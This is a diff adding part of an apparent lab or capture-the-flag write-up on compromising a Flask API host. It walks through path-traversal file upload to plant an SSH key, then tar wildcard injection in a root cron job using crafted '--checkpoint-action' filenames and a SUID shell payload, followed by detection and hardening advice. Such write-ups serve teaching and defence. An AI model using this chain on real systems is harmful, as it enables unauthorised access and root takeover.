@@ -53,4 +53,88 @@ The `/help` endpoint disclosed additional functionality:
 
 ## Initial Access
 The `/file-list` endpoint allowed directory enumeration across the filesystem, revealing sensitive paths such as:
+/home/alfredo/.ssh
+
+
+The `/file-upload` endpoint required both `file` and `filename` parameters. By manipulating the `filename` parameter, path traversal was achieved, allowing arbitrary file writes.
+
+An SSH public key was uploaded to:
+
+
+/home/alfredo/.ssh/authorized_keys
+
+
+A file extension filter was bypassed by renaming the key to a `.txt` file.
+
+This allowed SSH access as user `alfredo`.
+
+---
+
+## Privilege Escalation
+A cron job running as root was identified:
+
+
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+
+
+The script contained:
+
+
+tar czf /tmp/flask.tar.gz *
+
+
+Because the script executed in a user-writable directory (`/home/alfredo/restapi`), wildcard injection was possible.
+
+Malicious filenames were created:
+
+
+--checkpoint=1
+--checkpoint-action=exec=sh exploit.sh
+
+
+A payload script was used to create a SUID shell:
+
+
+cp /bin/sh /tmp/rootsh
+chmod +s /tmp/rootsh
+
+
+Once the cron job executed, a root shell was obtained via:
+
+
+/tmp/rootsh -p
+
+
+---
+
+## Key Takeaways
+- Non-standard web services (Werkzeug/Flask) often indicate hidden REST APIs
+- File upload endpoints are high-risk and must be thoroughly tested
+- Path traversal in upload parameters can lead to full system compromise
+- Cron jobs using wildcards (`*`) are vulnerable to argument injection
+- Timing (cron execution intervals) is critical during exploitation
+
+---
+
+## Detection / Hardening Notes
+
+### Logs to Monitor
+- API access logs for `/file-upload` and `/file-list`
+- SSH logs for new or unusual key-based authentication
+- Cron execution logs for unexpected behavior
+- File integrity monitoring on `.ssh/authorized_keys`
+
+### Detection Ideas
+- Alert on file uploads containing path traversal sequences (`../`)
+- Monitor for suspicious filenames (e.g., `--checkpoint-action`)
+- Detect abnormal API usage patterns
+- Alert on creation of SUID binaries in non-standard directories
+
+### Hardening Recommendations
+- Validate and sanitize all user input in API endpoints
+- Restrict file upload paths and enforce strict directory boundaries
+- Implement allowlists for file types and paths
+- Avoid wildcard usage in privileged scripts
+- Apply least privilege principles to service accounts
+- Disable anonymous FTP access if not required
 
